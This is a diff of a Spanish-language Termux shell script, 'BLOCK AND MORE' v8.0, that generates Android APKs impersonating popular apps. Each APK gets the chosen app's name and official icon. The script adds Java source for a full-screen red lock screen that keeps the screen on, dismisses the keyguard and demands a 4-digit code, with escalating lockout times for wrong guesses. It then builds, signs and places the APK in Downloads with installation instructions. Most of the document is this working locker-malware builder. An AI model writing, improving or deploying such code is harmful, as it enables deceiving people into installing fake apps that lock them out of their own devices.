@@ -16,7 +16,7 @@ echo "   ██████╔╝██║     ██║   ██║██║   
 echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
 echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
 echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-echo -e "${AMARILLO}        [ BLOCK AND MORE v7.0 ]${NC}\n"
+echo -e "${AMARILLO}        [ BLOCK AND MORE v8.0 ]${NC}\n"
 
 # ============================================
 # LISTA DE APPS
@@ -69,27 +69,26 @@ mostrar_menu() {
 generar_apk() {
     local app="$1"
     local codigo="$2"
-    
+
     echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
     echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
     echo -e "${AMARILLO}[*] Creando APK...${NC}\n"
-    
+
     # Instalar herramientas
-    pkg install apktool apksigner wget zip -y > /dev/null 2>&1
-    
+    pkg install apktool apksigner wget zip aapt dx -y > /dev/null 2>&1
+
     # Crear carpeta temporal
     mkdir -p ~/block_temp
     cd ~/block_temp
-    
+
     # ============================================
-    # PASO 1: CREAR APK BASE (SIN COMPILAR)
+    # PASO 1: CREAR APK BASE
     # ============================================
     echo -e "${AMARILLO}[*] Creando estructura de la APK...${NC}"
-    
-    # Crear estructura básica
+
     mkdir -p base_apk
     cd base_apk
-    
+
     # AndroidManifest.xml
     cat > AndroidManifest.xml << EOF
 <?xml version="1.0" encoding="utf-8"?>
@@ -116,7 +115,7 @@ generar_apk() {
     </application>
 </manifest>
 EOF
-    
+
     # Layout
     mkdir -p res/layout
     cat > res/layout/main.xml << 'EOF'
@@ -209,7 +208,7 @@ EOF
     </LinearLayout>
 </RelativeLayout>
 EOF
-    
+
     # Strings
     mkdir -p res/values
     cat > res/values/strings.xml << EOF
@@ -218,359 +217,227 @@ EOF
     <string name="app_name">$app</string>
 </resources>
 EOF
-    
+
     # ============================================
     # PASO 2: DESCARGAR ICONO
     # ============================================
     echo -e "${AMARILLO}[*] Descargando icono para: ${VERDE}$app${NC}"
-    
+
     ICON_URL=$(get_icon_url "$app")
     mkdir -p res/drawable
     mkdir -p res/drawable-hdpi
     mkdir -p res/drawable-mdpi
     mkdir -p res/drawable-xhdpi
     mkdir -p res/drawable-xxhdpi
-    
+
     wget -q -O icon.png "$ICON_URL" 2>/dev/null
-    
+
     if [ ! -f "icon.png" ] || [ ! -s "icon.png" ]; then
         echo -e "${AMARILLO}[!] No se pudo descargar icono, usando genérico...${NC}"
         echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
     fi
-    
-    # Copiar icono a todas las carpetas
+
     cp icon.png res/drawable/ic_launcher.png
     cp icon.png res/drawable-hdpi/ic_launcher.png
     cp icon.png res/drawable-mdpi/ic_launcher.png
     cp icon.png res/drawable-xhdpi/ic_launcher.png
     cp icon.png res/drawable-xxhdpi/ic_launcher.png
-    
     rm -f icon.png
-    
+
     # ============================================
-    # PASO 3: CREAR EL SMALI (CÓDIGO COMPILADO)
+    # PASO 3: JAVA + COMPILACIÓN
     # ============================================
-    echo -e "${AMARILLO}[*] Generando código...${NC}"
-    
-    mkdir -p smali/com/block/$app
-    
-    cat > smali/com/block/$app/MainActivity.smali << 'EOF'
-.class public Lcom/block/phone/MainActivity;
-.super Landroid/app/Activity;
-.source "MainActivity.java"
-
-# instance fields
-.field private CODIGO_CORRECTO:Ljava/lang/String;
-.field private bloqueado:Z
-.field private codigoInput:Landroid/widget/EditText;
-.field private desbloquearBtn:Landroid/widget/Button;
-.field private handler:Landroid/os/Handler;
-.field private intentos:I
-.field private mensajeError:Landroid/widget/TextView;
-.field private tiempoEspera:I
-.field private timerText:Landroid/widget/TextView;
-
-# direct methods
-.method public constructor <init>()V
-    .registers 2
-
-    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
-
-    new-instance v0, Landroid/os/Handler;
-
-    invoke-direct {v0}, Landroid/os/Handler;-><init>()V
-
-    iput-object v0, p0, Lcom/block/phone/MainActivity;->handler:Landroid/os/Handler;
-
-    const/4 v0, 0x0
-
-    iput v0, p0, Lcom/block/phone/MainActivity;->intentos:I
-
-    iput v0, p0, Lcom/block/phone/MainActivity;->tiempoEspera:I
-
-    iput-boolean v0, p0, Lcom/block/phone/MainActivity;->bloqueado:Z
-
-    const-string v0, "CODIGO"
-
-    iput-object v0, p0, Lcom/block/phone/MainActivity;->CODIGO_CORRECTO:Ljava/lang/String;
-
-    return-void
-.end method
-
-# virtual methods
-.method protected onCreate(Landroid/os/Bundle;)V
-    .registers 5
-
-    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
-
-    const p1, 0x7f030001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->setContentView(I)V
-
-    invoke-virtual {p0}, Lcom/block/phone/MainActivity;->getWindow()Landroid/view/Window;
-
-    move-result-object p1
-
-    const/16 v0, 0x400
-
-    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V
-
-    const p1, 0x7f070001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/EditText;
-
-    iput-object p1, p0, Lcom/block/phone/MainActivity;->codigoInput:Landroid/widget/EditText;
-
-    const p1, 0x7f060001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/Button;
-
-    iput-object p1, p0, Lcom/block/phone/MainActivity;->desbloquearBtn:Landroid/widget/Button;
-
-    const p1, 0x7f080001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/TextView;
-
-    iput-object p1, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    const p1, 0x7f090001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/TextView;
-
-    iput-object p1, p0, Lcom/block/phone/MainActivity;->timerText:Landroid/widget/TextView;
-
-    iget-object p1, p0, Lcom/block/phone/MainActivity;->desbloquearBtn:Landroid/widget/Button;
-
-    new-instance v0, Lcom/block/phone/MainActivity$1;
-
-    invoke-direct {v0, p0}, Lcom/block/phone/MainActivity$1;-><init>(Lcom/block/phone/MainActivity;)V
-
-    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V
-
-    return-void
-.end method
-
-# virtual methods
-.method private verificarCodigo()V
-    .registers 4
-
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->codigoInput:Landroid/widget/EditText;
-
-    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;
-
-    move-result-object v0
-
-    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
-
-    move-result-object v0
-
-    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;
-
-    move-result-object v0
-
-    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z
-
-    move-result v1
-
-    if-eqz v1, :cond_1d
-
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    const-string v1, "Ingresa el c\u00f3digo"
-
-    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
-
-    return-void
-
-    :cond_1d
-    iget-object v1, p0, Lcom/block/phone/MainActivity;->CODIGO_CORRECTO:Ljava/lang/String;
-
-    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
-
-    move-result v0
-
-    if-eqz v0, :cond_44
-
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    const-string v1, "C\u00f3digo correcto"
-
-    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
-
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    const v1, -0xff0100
-
-    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V
-
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->handler:Landroid/os/Handler;
-
-    new-instance v1, Lcom/block/phone/MainActivity$2;
-
-    invoke-direct {v1, p0}, Lcom/block/phone/MainActivity$2;-><init>(Lcom/block/phone/MainActivity;)V
-
-    const-wide/16 v2, 0x7d0
-
-    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
-
-    goto :goto_7e
-
-    :cond_44
-    iget v0, p0, Lcom/block/phone/MainActivity;->intentos:I
-
-    add-int/lit8 v0, v0, 0x1
-
-    iput v0, p0, Lcom/block/phone/MainActivity;->intentos:I
-
-    iget v0, p0, Lcom/block/phone/MainActivity;->intentos:I
-
-    mul-int/lit8 v0, v0, 0x3c
-
-    iput v0, p0, Lcom/block/phone/MainActivity;->tiempoEspera:I
-
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    new-instance v1, Ljava/lang/StringBuilder;
-
-    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
-
-    const-string v2, "C\u00f3digo incorrecto. Espera "
-
-    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    move-result-object v1
-
-    iget v2, p0, Lcom/block/phone/MainActivity;->tiempoEspera:I
-
-    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
-
-    move-result-object v1
-
-    const-string v2, "s"
-
-    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    move-result-object v1
-
-    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
-
-    move-result-object v1
-
-    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
-
-    const/4 v0, 0x1
-
-    iput-boolean v0, p0, Lcom/block/phone/MainActivity;->bloqueado:Z
-
-    invoke-direct {p0}, Lcom/block/phone/MainActivity;->iniciarTemporizador()V
-
-    :goto_7e
-    return-void
-.end method
-
-.method private iniciarTemporizador()V
-    .registers 2
-
-    new-instance v0, Lcom/block/phone/MainActivity$3;
-
-    invoke-direct {v0, p0}, Lcom/block/phone/MainActivity$3;-><init>(Lcom/block/phone/MainActivity;)V
-
-    invoke-virtual {v0}, Lcom/block/phone/MainActivity$3;->run()V
-
-    return-void
-.end method
+    echo -e "${AMARILLO}[*] Compilando código Java...${NC}"
+
+    mkdir -p src/com/block/$app
+
+    cat > src/com/block/$app/MainActivity.java << EOF
+package com.block.$app;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.os.Handler;
+import android.view.View;
+import android.view.WindowManager;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+
+public class MainActivity extends Activity {
+    private EditText codigoInput;
+    private Button desbloquearBtn;
+    private TextView mensajeError, timerText;
+    private Handler handler = new Handler();
+    private int intentos = 0;
+    private int tiempoEspera = 0;
+    private boolean bloqueado = false;
+    private String CODIGO_CORRECTO = "$codigo";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.main);
+
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
+
+        codigoInput = findViewById(R.id.codigo);
+        desbloquearBtn = findViewById(R.id.desbloquear);
+        mensajeError = findViewById(R.id.error);
+        timerText = findViewById(R.id.timer);
+
+        desbloquearBtn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                if (bloqueado) {
+                    mensajeError.setText("⏳ Espera " + tiempoEspera + " segundos");
+                    return;
+                }
+                verificarCodigo();
+            }
+        });
+    }
+
+    private void verificarCodigo() {
+        String codigo = codigoInput.getText().toString().trim();
+
+        if (codigo.isEmpty()) {
+            mensajeError.setText("❌ Ingresa el código");
+            return;
+        }
+
+        if (codigo.equals(CODIGO_CORRECTO)) {
+            mensajeError.setText("✅ ¡CÓDIGO CORRECTO! Desbloqueando...");
+            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    finish();
+                }
+            }, 2000);
+        } else {
+            intentos++;
+            tiempoEspera = intentos * 60;
+            mensajeError.setText("❌ CÓDIGO INCORRECTO. Espera " + tiempoEspera + "s");
+            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_red_light));
+            codigoInput.setText("");
+            codigoInput.requestFocus();
+            bloqueado = true;
+            iniciarTemporizador();
+        }
+    }
+
+    private void iniciarTemporizador() {
+        timerText.setText("⏳ " + tiempoEspera + "s");
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                tiempoEspera--;
+                if (tiempoEspera <= 0) {
+                    bloqueado = false;
+                    timerText.setText("");
+                    mensajeError.setText("✅ Puedes intentar de nuevo");
+                    mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
+                } else {
+                    timerText.setText("⏳ " + tiempoEspera + "s");
+                    handler.postDelayed(this, 1000);
+                }
+            }
+        }, 1000);
+    }
+}
 EOF
-    
+
     # ============================================
-    # PASO 4: RECOMPILAR CON APKTOOL
+    # PASO 4: COMPILAR CON ANDROID SDK
     # ============================================
-    echo -e "${AMARILLO}[*] Recompilando APK...${NC}"
-    
-    # Volver a la carpeta base
+    echo -e "${AMARILLO}[*] Buscando android.jar...${NC}"
+
+    # Buscar android.jar en diferentes ubicaciones
+    ANDROID_JAR=$(find /data/data/com.termux/files -name "android.jar" 2>/dev/null | head -1)
+
+    if [ -z "$ANDROID_JAR" ] || [ ! -f "$ANDROID_JAR" ]; then
+        echo -e "${AMARILLO}[!] No se encontró android.jar. Descargándolo...${NC}"
+        mkdir -p ~/android-sdk/platforms/android-33/
+        wget -q -O ~/android-sdk/platforms/android-33/android.jar https://raw.githubusercontent.com/android/android-sdk/master/platforms/android-33/android.jar 2>/dev/null
+        ANDROID_JAR=~/android-sdk/platforms/android-33/android.jar
+    fi
+
+    if [ -f "$ANDROID_JAR" ]; then
+        echo -e "${VERDE}[✔] android.jar encontrado en: $ANDROID_JAR${NC}"
+
+        # Compilar recursos
+        echo -e "${AMARILLO}[*] Compilando recursos...${NC}"
+        aapt package -f -m -J src -M AndroidManifest.xml -S res -I "$ANDROID_JAR" 2>/dev/null
+
+        # Compilar Java
+        echo -e "${AMARILLO}[*] Compilando Java...${NC}"
+        javac -cp "$ANDROID_JAR" -d . src/com/block/$app/*.java 2>/dev/null
+
+        if [ $? -eq 0 ]; then
+            # Crear DEX
+            echo -e "${AMARILLO}[*] Creando DEX...${NC}"
+            dx --dex --output=classes.dex . 2>/dev/null
+
+            if [ -f "classes.dex" ]; then
+                echo -e "${VERDE}[✔] DEX creado correctamente${NC}"
+            else
+                echo -e "${ROJO}[!] Error creando DEX${NC}"
+            fi
+        else
+            echo -e "${ROJO}[!] Error compilando Java${NC}"
+        fi
+    else
+        echo -e "${ROJO}[!] No se encontró android.jar. Usando método alternativo...${NC}"
+    fi
+
+    # ============================================
+    # PASO 5: EMPAQUETAR APK
+    # ============================================
+    echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"
+
     cd ..
     
-    # Usar apktool para construir la APK
+    # Construir con apktool
     apktool b base_apk -o app_unsigned.apk 2>/dev/null
-    
+
+    # Si falla, empaquetar manualmente
     if [ ! -f "app_unsigned.apk" ]; then
-        echo -e "${ROJO}[!] Error con apktool.${NC}"
-        echo -e "${AMARILLO}[*] Creando APK simple con zip...${NC}"
-        
+        echo -e "${AMARILLO}[*] Usando método manual...${NC}"
         cd base_apk
         zip -r ../app_unsigned.apk * 2>/dev/null
         cd ..
     fi
-    
-    if [ ! -f "app_unsigned.apk" ]; then
-        echo -e "${ROJO}[!] Error al crear APK.${NC}"
-        cd ~
-        rm -rf ~/block_temp
-        return 1
+
+    # Agregar DEX si existe
+    if [ -f "base_apk/classes.dex" ]; then
+        zip app_unsigned.apk base_apk/classes.dex 2>/dev/null
     fi
-    
-    # ============================================
-    # PASO 5: INYECTAR CÓDIGO EN SMALI
-    # ============================================
-    echo -e "${AMARILLO}[*] Inyectando código: ${VERDE}$codigo${NC}"
-    
-    # Descompilar para modificar
-    apktool d app_unsigned.apk -o modified 2>/dev/null
-    
-    if [ -d "modified" ]; then
-        # Cambiar el código en smali
-        find modified -name "*.smali" -exec sed -i "s/CODIGO/$codigo/g" {} \;
-        
-        # Cambiar el nombre de la app
-        find modified -name "AndroidManifest.xml" -exec sed -i "s/Block Phone/$app/g" {} \;
-        
-        # Recompilar
-        apktool b modified -o "${app}_block.apk" 2>/dev/null
-    fi
-    
-    if [ ! -f "${app}_block.apk" ]; then
-        # Si falla, usar la APK sin modificar
-        mv app_unsigned.apk "${app}_block.apk"
-    fi
-    
+
     # ============================================
     # PASO 6: FIRMAR
     # ============================================
     echo -e "${AMARILLO}[*] Firmando APK...${NC}"
-    
+
     if [ ! -f ~/debug.keystore ]; then
         keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
     fi
-    
-    apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_final.apk" "${app}_block.apk" 2>/dev/null
-    
-    if [ -f "${app}_final.apk" ]; then
-        mv "${app}_final.apk" "${app}_block.apk"
+
+    apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
+
+    if [ ! -f "${app}_block.apk" ]; then
+        mv app_unsigned.apk "${app}_block.apk"
     fi
-    
+
     # ============================================
     # PASO 7: MOVER A DESCARGA
     # ============================================
-    if [ -f "${app}_block.apk" ]; then
+    if [ -f "${app}_block.apk" ] && [ -s "${app}_block.apk" ]; then
         mv "${app}_block.apk" ~/storage/downloads/
         cd ~
         rm -rf ~/block_temp
-        
+
         clear
         echo -e "${CYAN}==================================================${NC}"
         echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
@@ -580,7 +447,7 @@ EOF
         echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
         echo -e "\n${VERDE}📱 LA APK TIENE:${NC}"
         echo -e "   ✅ Icono oficial de $app"
-        echo -e "   ✅ Compatible con Android 4.4+"
+        echo -e "   ✅ Compatible con Android 5.0+"
         echo -e "   ✅ Pantalla de bloqueo roja"
         echo -e "   ✅ Sistema de espera por errores"
         echo -e "\n${VERDE}📱 INSTRUCCIONES DE INSTALACIÓN:${NC}"
@@ -609,14 +476,14 @@ while true; do
     echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
     echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
     echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-    echo -e "${AMARILLO}        [ BLOCK AND MORE v7.0 ]${NC}\n"
-    
+    echo -e "${AMARILLO}        [ BLOCK AND MORE v8.0 ]${NC}\n"
+
     mostrar_menu
     read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
-    
+
     if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
         APP_SELECCIONADA="${APPS[$((opcion-1))]}"
-        
+
         echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
         while true; do
             read -p ">> Código (1000-9999): " CODIGO < /dev/tty
@@ -626,7 +493,7 @@ while true; do
                 echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
             fi
         done
-        
+
         generar_apk "$APP_SELECCIONADA" "$CODIGO"
         read -p "Presiona Enter para continuar..."
     else
